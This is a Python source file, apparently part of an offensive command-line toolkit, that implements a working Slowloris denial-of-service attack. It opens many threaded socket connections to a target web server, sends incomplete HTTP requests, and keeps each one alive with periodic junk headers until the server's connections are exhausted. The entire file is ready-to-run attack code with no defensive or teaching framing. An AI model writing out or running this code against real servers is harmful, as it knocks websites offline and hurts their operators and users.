import random
import socket
import time

import typer

from attackcli.utils.thread_exec import ThreadedExecutor


def _send_slowloris_request(target: str, port: int, timeout: float):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target, port))

        s.send(f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target}\r\n".encode("utf-8"))

        while True:
            try:
                time.sleep(15)
                typer.echo(typer.style(f"Sending packet {target}:{port}", fg=typer.colors.BRIGHT_BLACK))
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except socket.error:
                break
    except Exception:
        pass


def slowloris_attack(target: str, port: int, timeout: float, workers: int):
    typer.echo(typer.style("[!] To stop Press CTRL+C to stop it.", fg=typer.colors.WHITE, bold=True))
    executor = ThreadedExecutor(max_workers=workers)
    executor.start()

    try:
        while True:
            executor.submit(_send_slowloris_request, target, port, timeout)
    except KeyboardInterrupt:
        executor.wait()
